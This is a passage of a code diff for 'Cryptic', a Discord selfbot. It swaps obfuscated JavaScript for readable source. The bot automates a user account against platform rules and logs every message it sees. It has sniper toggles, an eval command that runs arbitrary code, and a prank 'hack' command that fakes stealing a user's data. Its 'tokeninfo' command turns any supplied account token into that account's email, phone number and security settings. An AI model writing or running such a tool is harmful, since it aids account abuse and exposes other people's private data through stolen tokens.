_0x47f415(_0x8be828,_0x2959cd-0x2c9);};_0x57acc3[_0x14063a(0x845,0x8b3)](_0x14063a(0x66a,0x79f)+_0x488136[_0x14063a(0x6df,0x6a1)]),setTimeout(()=>{const _0x55856f=function(_0x32f753,_0x259fb0){return _0x14063a(_0x32f753-0x1bc,_0x259fb0);};_0x57acc3['edit'](_0x55856f(0x882,0x972)+_0x488136[_0x55856f(0x9a7,0x9b6)]),setTimeout(()=>{const _0x47e7d5=function(_0x124fd8,_0x2fa248){return _0x55856f(_0x124fd8- -0x27e,_0x2fa248);};_0x57acc3[_0x47e7d5(0x783,0x785)](_0x47e7d5(0x5b1,0x4ee)+_0x488136['id']),setTimeout(()=>{const _0x10d725=function(_0x505c73,_0x4fe488){return _0x47e7d5(_0x4fe488-0x82,_0x505c73);};_0x57acc3[_0x10d725(0x7e2,0x805)](_0x10d725(0x6bb,0x57d)+_0x488136[_0x10d725(0x79d,0x7ab)]+_0x10d725(0x70b,0x661)),setTimeout(()=>{const _0x59750b=function(_0x4a64d2,_0x4e7396){return _0x10d725(_0x4a64d2,_0x4e7396-0x3d4);};_0x57acc3[_0x59750b(0xaa9,0xbd9)](_0x59750b(0xb7b,0xbd6)),setTimeout(()=>{const _0x1dc211=function(_0x38040f,_0x47e32f){return _0x59750b(_0x47e32f,_0x38040f-0xd7);};_0x57acc3[_0x1dc211(0xcb0,0xb69)](_0x1dc211(0xb35,0x9a1)),setTimeout(()=>{const _0x363cf4=function(_0x12e021,_0xcc2529){return _0x1dc211(_0xcc2529- -0x3af,_0x12e021);};_0x57acc3[_0x363cf4(0x996,0x901)](_0x363cf4(0x817,0x807)+_0x318ada[_0x363cf4(0xa04,0x920)]),setTimeout(()=>{const _0x2f2f0f=function(_0xccc075,_0x22affb){return _0x363cf4(_0xccc075,_0x22affb- -0x3d2);};_0x57acc3[_0x2f2f0f(0x58c,0x52f)](_0x2f2f0f(0x638,0x516)),setTimeout(()=>{const _0x2ace7b=function(_0x1c8b34,_0x44b3f7){return _0x2f2f0f(_0x1c8b34,_0x44b3f7- -0x295);};_0x57acc3[_0x2ace7b(0x428,0x29a)](_0x2ace7b(0x2b1,0x242)+_0x5d85f4),setTimeout(()=>{setTimeout(()=>{const _0x55bfe6=function(_0xdc336a,_0x3fde76){return _0x43a6(_0x3fde76-0x395,_0xdc336a);};_0x57acc3[_0x55bfe6(0x999,0x85c)](_0x55bfe6(0x58b,0x6c6)),setTimeout(()=>{const _0x562ad3=function(_0x45293b,_0x2b075c){return _0x55bfe6(_0x2b075c,_0x45293b-0x35e);};_0x57acc3[_0x562ad3(0xbba,0xa4e)](_0x562ad3(0xb85,0xb5b)),setTimeout(()=>{const _0x3f8c83=function(_0xc9f82,_0x4e994b){return _0x562ad3(_0xc9f82-0x236,_0x4e994b);};_0x1b369a[_0x3f8c83(0xb2c,0xa29)][_0x3f8c83(0xb4f,0xb5a)](_0x3f8c83(0xb59,0xc7b));},0xe5c+0x161c+-0x2090);},0x16e4+-0x18a3+-0x115f*-0x1);},0x3*-0x572+-0x109*0x21+0x421f);},-0x1836+0x1386+0x1450);},0x1*-0x13bb+-0x1*-0xc3d+0x171e);},-0x52b+-0x953+-0xa*-0x303);},0x1909+0x25b2+-0x2f1b);},0x2*0x1115+0xb5*-0x34+-0x91d*-0x2);},0x1*0x545+-0x83*-0x11+0x1a8);},-0x16f*0xb+0x1*0xba2+0x13c3);},0x65*-0x61+0x986*-0x1+0x3f6b);},-0x1d3d+0x1*-0x7cd+0x2*0x1a55);},0x25b7+-0x67a+0x7*-0x23b);},-0x2051+0x2407+-0x5f5*-0x2);},0x140d+0xcf5+0xb2*-0x19);},0xd*-0xe9+-0x1b65*0x1+0x36da);}_0x390a85===_0x1be328(0x616,0x656)&&(console[_0x1be328(0x6da,0x80d)]('['+colors[_0x1be328(0x57b,0x6da)](moment()[_0x1be328(0x4bf,0x5fa)]()[_0x1be328(0x6ed,0x5e5)](_0x1be328(0x5fa,0x515)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x41a))+'\x20'+colors['magenta']('|')+'\x20'+colors['yellow'](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x7d0)]&&_0x1b369a[_0x1be328(0x594,0x6ed)](),console[_0x1be328(0x68c,0x68c)]());if(_0x390a85===_0x1be328(0x583,0x478)){console[_0x1be328(0x6da,0x5ab)]('['+colors[_0x1be328(0x57b,0x6d0)](moment()[_0x1be328(0x4bf,0x3a9)]()['format'](_0x1be328(0x5fa,0x61e)))+']\x20'+colors[_0x1be328(0x632,0x60f)](_0x1be328(0x596,0x67f))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x714)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x724)]&&_0x1b369a[_0x1be328(0x594,0x510)]();const _0xc34deb=bot[_0x1be328(0x4d7,0x41d)][_0x1be328(0x6b4,0x684)](_0x1b369a['channel']['id'])||[],_0x27207f=_0xc34deb[_0x1748bb[-0x1*0x1f43+-0x1*-0x3e+0x1f05]-(-0x17cb+0x17ef+-0x23)||-0x4*0x816+-0x1052+0x2*0x1855];if(!_0x27207f)return _0x1b369a[_0x1be328(0x49d,0x3e8)]['send'](_0x1be328(0x558,0x651));if(enabled===!![]){let _0x3df04d=new Discord[(_0x1be328(0x508,0x3ff))]()[_0x1be328(0x735,0x7b6)](_0x27207f[_0x1be328(0x5f7,0x636)]['tag'],_0x27207f[_0x1be328(0x5f7,0x563)][_0x1be328(0x5d4,0x570)])[_0x1be328(0x76c,0x6fb)](_0x27207f[_0x1be328(0x4f8,0x3f6)]+_0x1be328(0x67e,0x7ed)+_0x27207f[_0x1be328(0x6e7,0x83b)]+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Page**\x20»\x20'+(_0x1748bb[0x1e8a+-0x1632+0x2c8*-0x3]||-0x4*0x94e+-0x239*-0x3+0x1e8e*0x1)+'/'+_0xc34deb[_0x1be328(0x537,0x690)]+_0x1be328(0x4af,0x3b9))[_0x1be328(0x5d3,0x5ee)](image?image:_0x1be328(0x56d,0x611))[_0x1be328(0x5aa,0x72d)](color?color:_0x1be328(0x4c1,0x4ad))[_0x1be328(0x69b,0x71a)](footer?footer:_0x1be328(0x524,0x60f));_0x27207f[_0x1be328(0x752,0x8c9)]&&_0x3df04d[_0x1be328(0x49f,0x5b6)](_0x27207f[_0x1be328(0x752,0x5c1)]),_0x1b369a[_0x1be328(0x49d,0x423)][_0x1be328(0x4c0,0x5f3)](_0x3df04d);}else _0x1b369a[_0x1be328(0x49d,0x363)][_0x1be328(0x4c0,0x528)](stripIndents`\`\`\`
-            ${_0x27207f[_0x1be328(0x5f7,0x625)][_0x1be328(0x6ba,0x57b)]}
+const Discord = require("discord.js");
+const moment = require("moment");
+const colors = require("colors");
+const axios = require("axios").default;
+const title = require("console-title");
+const fetch = require("node-fetch");
+const figlet = require("figlet");
+const config = require("./config.json");
+const superagent = require("superagent");
+const bot = new Discord.Client();
+const { color, image, footer, enabled } = config.embedOptions;
+const { post } = require("node-superfetch");
+const { stripIndents } = require("common-tags");
+const { Type } = require("@extreme_hero/deeptype");
+const { inspect } = require("util");
+const fs = require("fs");
+const webhook = require("webhook-discord");
 
-            ${_0x27207f['content']}
+const selfbot = {
+    version: "5.3.1",
+    name: "Cryptic",
+    linecount: 2346
+}
 
-            Date » ${_0x27207f[_0x1be328(0x6e7,0x64a)]}
-            Page » ${_0x1748bb[-0xb*0xab+0x1a84+-0x132b]||0x1*0x1ee5+-0x25ca+0x373*0x2}/${_0xc34deb[_0x1be328(0x537,0x566)]}${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85===_0x1be328(0x577,0x4e1)){console['log']('['+colors[_0x1be328(0x57b,0x59b)](moment()['utc']()[_0x1be328(0x6ed,0x785)](_0x1be328(0x5fa,0x473)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x646))+'\x20'+colors[_0x1be328(0x5db,0x6a0)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x633)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7b9)]&&_0x1b369a[_0x1be328(0x594,0x6d5)]();const _0x5e934c=_0x1b369a;let _0x1514cb=_0x1748bb[_0x1be328(0x5c6,0x441)]('\x20');_0x1514cb=_0x1514cb['replace'](/[“”]/g,'\x22')[_0x1be328(0x4b4,0x57b)](/[‘’]/g,'\x27');let _0x10c79c;try{const _0x3000e2=process[_0x1be328(0x5de,0x637)]();_0x10c79c=eval(_0x1514cb);_0x10c79c instanceof Promise&&(_0x10c79c=await _0x10c79c);const _0x316753=process[_0x1be328(0x5de,0x643)](_0x3000e2),_0x311989={};_0x311989['depth']=0x0;const _0x449eae=['**Output:**\x20```js\x0a'+_0x46c918(inspect(_0x10c79c,_0x311989))+_0x1be328(0x720,0x74f),_0x1be328(0x4b7,0x371)+new Type(_0x10c79c)['is']+_0x1be328(0x720,0x75a),_0x1be328(0x799,0x815)+(_0x316753[-0x639+-0x22f4+0x292d]*(-0x1*-0x2bf685f4+0x625b2627*-0x1+-0x16ccaed7*-0x5)+_0x316753[0x2*0xc89+0x1e6d+-0x377e])/(-0xb*0x19b43+-0x4618*0x16+0x1*0x26f431)+_0x1be328(0x6e8,0x66d)],_0x2b4dae=_0x449eae[_0x1be328(0x5c6,0x530)]('\x0a');if(_0x2b4dae[_0x1be328(0x537,0x48d)]<0x72f*-0x5+0x10c*-0x2+0x2dd3*0x1)await _0x5e934c[_0x1be328(0x49d,0x4b8)][_0x1be328(0x4c0,0x58f)](_0x2b4dae);else{const _0x198843=new Discord[(_0x1be328(0x5e9,0x560))](Buffer[_0x1be328(0x66b,0x500)](_0x2b4dae),_0x1be328(0x68b,0x587));await _0x5e934c[_0x1be328(0x49d,0x38b)][_0x1be328(0x4c0,0x635)](_0x198843);}}catch(_0x2c28d7){return _0x1b369a[_0x1be328(0x49d,0x38a)][_0x1be328(0x4c0,0x48d)]('Error:\x20```xl\x0a'+_0x46c918(_0x2c28d7)+_0x1be328(0x720,0x596));}function _0x46c918(_0x358ebc){const _0x3ab029=function(_0x362830,_0x3f122d){return _0x1be328(_0x362830- -0x385,_0x3f122d);};return typeof _0x358ebc===_0x3ab029(0x395,0x51d)&&(_0x358ebc=_0x358ebc[_0x3ab029(0x12f,-0x3a)](/`/g,'`'+String[_0x3ab029(0x3aa,0x403)](-0x496*0x1+-0x189d+0x3d3e))[_0x3ab029(0x12f,0x120)](/@/g,'@'+String[_0x3ab029(0x3aa,0x427)](-0x2dc+-0x906+0x2bed))[_0x3ab029(0x12f,-0x59)](new RegExp(config[_0x3ab029(0x3fb,0x469)],'gi'),'*'[_0x3ab029(0x126,0x5b)](config[_0x3ab029(0x3fb,0x2f1)][_0x3ab029(0x1b2,0xc2)]))[_0x3ab029(0x12f,-0x2)](new RegExp(config[_0x3ab029(0x406,0x3ad)],'gi'),'*'[_0x3ab029(0x126,0xf2)](config[_0x3ab029(0x406,0x3f2)][_0x3ab029(0x1b2,0x123)]))[_0x3ab029(0x12f,0x255)](new RegExp(config[_0x3ab029(0x1ad,0x112)],'gi'),'*'[_0x3ab029(0x126,0xea)](config[_0x3ab029(0x1ad,0x141)][_0x3ab029(0x1b2,0x37)]))),_0x358ebc;}}if(_0x390a85===_0x1be328(0x63c,0x53a)){console[_0x1be328(0x6da,0x835)]('['+colors[_0x1be328(0x57b,0x6e4)](moment()[_0x1be328(0x4bf,0x404)]()[_0x1be328(0x6ed,0x802)](_0x1be328(0x5fa,0x4e2)))+']\x20'+colors[_0x1be328(0x632,0x5f3)](_0x1be328(0x596,0x67f))+'\x20'+colors[_0x1be328(0x5db,0x6a2)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x573)](_0x390a85));_0x1b369a['deletable']&&_0x1b369a[_0x1be328(0x594,0x441)]();if(!_0x1748bb[_0x1be328(0x5c6,0x6ec)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x452)][_0x1be328(0x4c0,0x532)](_0x1be328(0x5eb,0x663));const {body:_0xb39211}=await post(_0x1be328(0x581,0x5bd))['send'](_0x1748bb[_0x1be328(0x5c6,0x58d)]('\x20'));let _0x549c37=new Discord[(_0x1be328(0x508,0x651))]()[_0x1be328(0x5d3,0x5c2)](image?image:_0x1be328(0x793,0x7dd))[_0x1be328(0x5aa,0x529)](color?color:_0x1be328(0x4c1,0x5ac))[_0x1be328(0x69b,0x685)](footer?footer:_0x1be328(0x524,0x499))[_0x1be328(0x76c,0x7ae)](_0x1be328(0x5c8,0x635)+_0xb39211[_0x1be328(0x592,0x5a7)]);_0x1b369a[_0x1be328(0x49d,0x614)][_0x1be328(0x4c0,0x609)](_0x549c37);}if(_0x390a85===_0x1be328(0x6cd,0x7c2)){console[_0x1be328(0x6da,0x554)]('['+colors['green'](moment()[_0x1be328(0x4bf,0x3da)]()[_0x1be328(0x6ed,0x6f3)](_0x1be328(0x5fa,0x541)))+']\x20'+colors[_0x1be328(0x632,0x7ba)](_0x1be328(0x596,0x58b))+'\x20'+colors[_0x1be328(0x5db,0x75d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4d9)](_0x390a85));let _0x34769f=parseInt(_0x1748bb[-0x1122+-0x1*-0x11b+0x1007*0x1]||-0xb7e*0x2+0x486+-0x1d*-0xa3);const _0x139af7={};_0x139af7[_0x1be328(0x639,0x529)]=0x64,_0x1b369a[_0x1be328(0x49d,0x5e0)][_0x1be328(0x538,0x685)](_0x139af7)['then'](async _0x372c39=>{const _0xb2d3=function(_0x16af55,_0x376629){return _0x1be328(_0x376629- -0x10d,_0x16af55);};let _0x5e19ff=_0x372c39[_0xb2d3(0x582,0x443)]();_0x5e19ff=_0x5e19ff[_0xb2d3(0x45c,0x477)](_0x4797b3=>_0x4797b3[_0xb2d3(0x638,0x4ea)]['id']===bot[_0xb2d3(0x4e5,0x3e1)]['id']),_0x5e19ff['length']=_0x34769f+(0x1*-0xf3a+-0x17*-0x86+-0x13*-0x2b),_0x5e19ff[_0xb2d3(0x5fb,0x5b4)](_0x382915=>_0x382915[_0xb2d3(0x570,0x487)]()['catch'](_0x16245e=>{const _0x929dcd=function(_0x59691e,_0x23f446){return _0xb2d3(_0x23f446,_0x59691e-0x22d);};_0x1b369a['channel'][_0x929dcd(0x5e0,0x56a)](_0x929dcd(0x75b,0x700)+_0x16245e+_0x929dcd(0x840,0x943));}));});}if(_0x390a85===_0x1be328(0x499,0x3d5)){console[_0x1be328(0x6da,0x569)]('['+colors[_0x1be328(0x57b,0x6b9)](moment()[_0x1be328(0x4bf,0x5d2)]()[_0x1be328(0x6ed,0x58d)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x4f9)](_0x1be328(0x596,0x479))+'\x20'+colors[_0x1be328(0x5db,0x4f9)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x5f2)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x63d)]&&_0x1b369a['delete']();const _0x1a2bc9={};_0x1a2bc9['\x20']='\x20',_0x1a2bc9['0']=_0x1be328(0x78c,0x792),_0x1a2bc9['1']=_0x1be328(0x6fe,0x71e),_0x1a2bc9['2']=_0x1be328(0x604,0x591),_0x1a2bc9['3']=_0x1be328(0x712,0x639),_0x1a2bc9['4']=_0x1be328(0x722,0x871),_0x1a2bc9['5']=_0x1be328(0x75a,0x8d9),_0x1a2bc9['6']=_0x1be328(0x4f5,0x4fd),_0x1a2bc9['7']=_0x1be328(0x749,0x67d),_0x1a2bc9['8']=_0x1be328(0x58a,0x690),_0x1a2bc9['9']=_0x1be328(0x70c,0x804),_0x1a2bc9['!']=_0x1be328(0x63f,0x65b),_0x1a2bc9['?']=_0x1be328(0x5f1,0x6da),_0x1a2bc9['#']=':hash:',_0x1a2bc9['*']=':asterisk:',_0x1a2bc9['$']=_0x1be328(0x760,0x8ba),_0x1a2bc9['+']=_0x1be328(0x60a,0x78f),_0x1a2bc9['-']=_0x1be328(0x564,0x6bc),_0x1a2bc9['/']=_0x1be328(0x61f,0x735);const _0x57c702=_0x1a2bc9;_0x1be328(0x5f8,0x583)[_0x1be328(0x67f,0x6cc)]('')[_0x1be328(0x787,0x7f6)](_0x1ffdf4=>{const _0x83d9b3=function(_0x131605,_0x4818da){return _0x1be328(_0x4818da- -0x72,_0x131605);};_0x57c702[_0x1ffdf4]=_0x57c702[_0x1ffdf4[_0x83d9b3(0x4d0,0x46f)]()]=_0x83d9b3(0x6be,0x6bf)+_0x1ffdf4+':';});if(_0x1748bb[_0x1be328(0x537,0x63e)]<0x3*0x2ba+0x60*0x53+-0x1*0x274d)return _0x1b369a[_0x1be328(0x49d,0x5f2)][_0x1be328(0x4c0,0x3ad)](_0x1be328(0x700,0x71c));_0x1b369a[_0x1be328(0x49d,0x40d)][_0x1be328(0x4c0,0x40f)](_0x1748bb[_0x1be328(0x5c6,0x621)]('\x20')[_0x1be328(0x67f,0x757)]('')[_0x1be328(0x6c1,0x7c1)](_0x1661ae=>_0x57c702[_0x1661ae]||_0x1661ae)[_0x1be328(0x5c6,0x4e8)](''));}if(_0x390a85==='cb'){console[_0x1be328(0x6da,0x645)]('['+colors[_0x1be328(0x57b,0x6ea)](moment()[_0x1be328(0x4bf,0x4e1)]()[_0x1be328(0x6ed,0x5d2)](_0x1be328(0x5fa,0x637)))+']\x20'+colors[_0x1be328(0x632,0x4b5)]('Command\x20used')+'\x20'+colors[_0x1be328(0x5db,0x6af)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x69b)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x636)]&&_0x1b369a[_0x1be328(0x594,0x6b7)]();_0x1b369a[_0x1be328(0x49d,0x497)][_0x1be328(0x549,0x49e)]();try{const _0x2e6c90=await fetch(_0x1be328(0x539,0x499)+encodeURIComponent(_0x1748bb[_0x1be328(0x5c6,0x538)]('\x20'))),_0x494ed=await _0x2e6c90[_0x1be328(0x6ee,0x723)]();_0x1b369a[_0x1be328(0x49d,0x414)][_0x1be328(0x4c0,0x58a)]('>\x20'+_0x1748bb[_0x1be328(0x5c6,0x4dd)]('\x20')+'\x0a'+_0x1b369a[_0x1be328(0x5f7,0x4ef)]+'\x20'+_0x494ed[_0x1be328(0x553,0x547)]),_0x1b369a['channel'][_0x1be328(0x4d4,0x61e)](!![]);}catch(_0x16e36a){return _0x1b369a[_0x1be328(0x49d,0x40b)][_0x1be328(0x4d4,0x4a9)](!![]),_0x1b369a[_0x1be328(0x49d,0x37a)][_0x1be328(0x4c0,0x516)](_0x1be328(0x63b,0x7b9)+_0x16e36a[_0x1be328(0x630,0x632)]+_0x1be328(0x720,0x6dd));}}_0x390a85===_0x1be328(0x540,0x46b)&&(console[_0x1be328(0x6da,0x84b)]('['+colors[_0x1be328(0x57b,0x410)](moment()[_0x1be328(0x4bf,0x4fe)]()[_0x1be328(0x6ed,0x5f5)](_0x1be328(0x5fa,0x640)))+']\x20'+colors[_0x1be328(0x632,0x730)](_0x1be328(0x596,0x641))+'\x20'+colors[_0x1be328(0x5db,0x749)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4ba)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x63e)]&&_0x1b369a[_0x1be328(0x594,0x44e)](),_0x1b369a[_0x1be328(0x49d,0x5fa)][_0x1be328(0x4c0,0x449)](_0x1748bb[_0x1be328(0x5c6,0x5d6)]('\x20')));_0x390a85===_0x1be328(0x5ec,0x76a)&&(console[_0x1be328(0x6da,0x583)]('['+colors['green'](moment()[_0x1be328(0x4bf,0x510)]()[_0x1be328(0x6ed,0x7c0)](_0x1be328(0x5fa,0x6bf)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x456))+'\x20'+colors[_0x1be328(0x5db,0x6bc)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4dd)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x5a5)]&&_0x1b369a[_0x1be328(0x594,0x4e3)](),_0x1b369a[_0x1be328(0x49d,0x313)][_0x1be328(0x4c0,0x647)](_0x1be328(0x766,0x874))[_0x1be328(0x67d,0x5ed)](_0x2a76f9=>{const _0x409fa8=function(_0x488b83,_0x3a300a){return _0x1be328(_0x488b83- -0x1bb,_0x3a300a);};if(enabled===!![]){let _0x4e6570=new Discord[(_0x409fa8(0x34d,0x1e9))]()[_0x409fa8(0x2e7,0x304)](_0x409fa8(0x421,0x48c))[_0x409fa8(0x5b1,0x4a0)](_0x409fa8(0x53e,0x520)+(_0x2a76f9[_0x409fa8(0x590,0x714)]-_0x1b369a[_0x409fa8(0x590,0x6a2)])+'ms\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**WebSocket**\x20»\x20'+bot[_0x409fa8(0x431,0x583)]+_0x409fa8(0x432,0x470))['setThumbnail'](image?image:_0x409fa8(0x3b2,0x25d))[_0x409fa8(0x3ef,0x2b9)](color?color:_0x409fa8(0x306,0x35b))[_0x409fa8(0x4e0,0x579)](footer?footer:_0x409fa8(0x369,0x27b));_0x2a76f9[_0x409fa8(0x5a6,0x616)](_0x4e6570);}else _0x2a76f9[_0x409fa8(0x5a6,0x619)](stripIndents`\`\`\`
+// Process
+process.on("unhandledRejection", error => console.log(`${colors.red("[ERROR]:")} ${colors.yellow(error.message)}`))
+process.on("uncaughtExceptionMonitor", error => console.log(`${colors.red("[ERROR]:")} ${colors.yellow(error.message)}`))
+process.on("uncaughtException", error => console.log(`${colors.red("[ERROR]:")} ${colors.yellow(error.message)}`))
+// Process
+
+bot.snipes = new Map()
+
+console.log("Logging in, please wait...")
+title(`[${selfbot.name} v${selfbot.version}] Loading...`)
+bot.on("ready", async () => {
+console.clear()
+title(`[${selfbot.name} v${selfbot.version}] Logged in as ${bot.user.username}`)
+    console.log(`
+
+
+                            ${colors.red(`
+                             ██████╗██████╗ ██╗   ██╗██████╗ ████████╗██╗ ██████╗
+                            ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██║██╔════╝
+                            ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║██║     
+                            ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║██║     
+                            ╚██████╗██║  ██║   ██║   ██║        ██║   ██║╚██████╗
+                             ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ╚═╝ ╚═════╝
+                             `)}
+                                                      
+ 
+
+                            ${colors.red(selfbot.name)} ${colors.cyan(`v${selfbot.version}`)} ${colors.yellow("|")} ${colors.red("Logged in as")} ${colors.cyan(bot.user.tag)} ${colors.yellow("|")} ${colors.red("ID:")} ${colors.cyan(bot.user.id)}
+                            ${colors.red("Nitro Sniper?")} ${config.nitro_sniper ? colors.green("Enabled") : colors.red("Disabled")}
+                            ${colors.red("Giveaway Sniper?")} ${config.giveaway_sniper ? colors.green("Enabled") : colors.red("Disabled")}
+                            ${colors.red("Prefix:")} ${colors.cyan(`${config.prefix}`)}
+                            ${colors.red("GitHub:")} ${colors.cyan("https://github.com/p9sq/Cryptic")}
+                            ${colors.red("Developer:")} ${colors.cyan("p9sq69#0594")}
+    `)
+
+    if(config.credit === true) {
+        bot.user.setActivity("https://discord.com/invite/FRGKTJsFJg", {type: "PLAYING"})
+    }
+})
+
+bot.on("message", async(message) => {
+
+    if(config.messageLogs === true) {
+        console.log(`${colors.red(message.guild.name)} : ${colors.blue(message.channel.name)} : ${colors.yellow(message.author.tag)} : ${colors.green(message.content)}`)
+    }
+    
+    if(message.author.bot) return;
+    let prefix = config.prefix;
+    let messageArray = message.content.split(" ")
+    let cmd = messageArray[0].replace(prefix, "");
+    let args = messageArray.slice(1);
+    if(!message.content.startsWith(prefix)) return;
+
+    if(config.whitelisted.includes(message.author.id) || message.author.id === bot.user.id) {
+    
+    // Selfbot commands
+    if(cmd === "rainbow") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const role = message.mentions.roles.first()
+        if(!role) return message.channel.send("Please mention a role")
+        let embed = new Discord.RichEmbed()
+        .setTitle("Success")
+        .setDescription(`Successfully made the ${role.name} role rainbow`)
+        .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+        message.channel.send(embed)
+        setInterval(() => {
+            role.edit({
+                color: "RANDOM"
+            })
+        })
+    }
+
+    if(cmd === "tokeninfo") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const inputToken = args[0];
+        if(!inputToken) return message.channel.send("Please specify a token")
+        const headers = {
+            'Authorization': inputToken,
+            'Content-Type': 'application/json'
+        }
+
+        try {
+            fetch("https://canary.discordapp.com/api/v6/users/@me", {
+                method: "GET",
+                headers: headers
+            }).then(async res => {
+                const result = await res.json()
+                let embed = new Discord.RichEmbed()
+                .setColor(color ? color : "#1B78E7")
+                .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+                .setThumbnail(`https://cdn.discordapp.com/avatars/${result.id}/${result.avatar}.png?size=2048`)
+                .setDescription(`
+                **ID** » ${result.id}
+                **Username** » ${result.username}
+                **Discriminator** » ${result.discriminator}
+                **Public Flags** » ${result.public_flags.toLocaleString()}
+                **Flags** » ${result.flags.toLocaleString()}
+                **Email** » ${result.email ? result.email : "None"}
+                **Verified?** » ${result.verified ? "Yes" : "No"}
+                **Locale** » ${result.locale}
+                **NSFW?** » ${result.nsfw_allowed ? "Yes" : "No"}
+                **MFA?** » ${result.mfa_enabled ? "Yes" : "No"}
+                **Phone Number** » ${result.phone ? result.phone : "None"}
+                `)
+                message.channel.send(embed)
+            })
+        } catch(err) {
+            console.log(`${colors.red("[ERROR]:")} ${colors.yellow("Invalid token")}`)
+        }
+    }
+
+    if(cmd === "codeblock") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const types = ["js", "json", "ts", "lua", "css", "html", "yaml", "py", "ruby", "java"]
+        if(!types.includes(args[0])) return message.channel.send(`Please specify a valid type. Types: \`${types.join("`, `")}\``)
+        let embed = new Discord.RichEmbed()
+        .setTitle("Code Block")
+        .setDescription(`\`\`\`${args[0]}\n${args.slice(1).join(" ")}\n\`\`\``)
+        .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+        message.channel.send(embed)
+    }
+
+    if(cmd === "hack") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get("https://some-random-api.ml/bottoken")
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        const targetID = bot.users.get(args[0])
+        if(!targetID) return message.channel.send("Please specify a user id")
+        const msg = await message.channel.send(`Hacking ${targetID.username} now...`)
+        const ips = [
+            "40.2.54.239",
+            "145.58.134.145",
+            "90.135.87.199",
+            "251.224.76.96",
+            "94.199.139.255"
+        ];
+        const ip = ips[Math.floor(Math.random()*(ips.length))];
+        const emails = [
+            `${targetID.username}@gmail.com`,
+            "support@discord.com",
+            `${targetID.username}${targetID.discriminator}@hotmail.com`,
+            `${targetID.username}.${targetID.discriminator}@discord.com`
+        ];
+        const email = emails[Math.floor(Math.random()*(emails.length))];
+        const passwords = [
+            "DiscordIsCool",
+            "selfbotsAreAgainsDiscordTOS",
+            "YoMamaIsGay",
+            "Password",
+            "MyPasswordJustGotLeaked"
+        ];
+        const password = passwords[Math.floor(Math.random()*(passwords.length))];
+        const sentences = [
+            "I like ya cut g",
+            "Can you send me your token?",
+            "Can I have your bots source code?",
+            `${password} is my password to my discord account... :flushed:`,
+            "Your mum is so ugly, that she made my happy meal cry :sunglasses:"
+        ];
+        const sentence = sentences[Math.floor(Math.random()*(sentences.length))];
+        setTimeout(() => {
+            msg.edit(`**Found IP** » ${ip}`)
+            setTimeout(() => {
+                msg.edit(`**Found Email** » ${email}`)
+                setTimeout(() => {
+                    msg.edit(`**Found Password** » ${password}`)
+                    setTimeout(() => {
+                        msg.edit(`**Found Username** » ${targetID.username}`)
+                        setTimeout(() => {
+                            msg.edit(`**Found Discriminator** » ${targetID.discriminator}`)
+                            setTimeout(() => {
+                                msg.edit(`**Found ID** » ${targetID.id}`)
+                                setTimeout(() => {
+                                    msg.edit(`**Injecting virus into discriminator** » ${targetID.discriminator}...`)
+                                    setTimeout(() => {
+                                        msg.edit(`**Reported to discord for selfbotting...**`)
+                                        setTimeout(() => {
+                                            msg.edit("**Successfully reported**")
+                                            setTimeout(() => {
+                                                msg.edit(`**Found Token** » ${body.token}`)
+                                                setTimeout(() => {
+                                                    msg.edit(`**Fetching DMs...**`)
+                                                    setTimeout(() => {
+                                                        msg.edit(`**Most common sentence** » ${sentence}`)
+                                                        setTimeout(() => {
+                                                            setTimeout(() => {
+                                                                msg.edit(`**Sold all found data to the government...**`)
+                                                                setTimeout(() => {
+                                                                    msg.edit(`**Complete!**`)
+                                                                    setTimeout(() => {
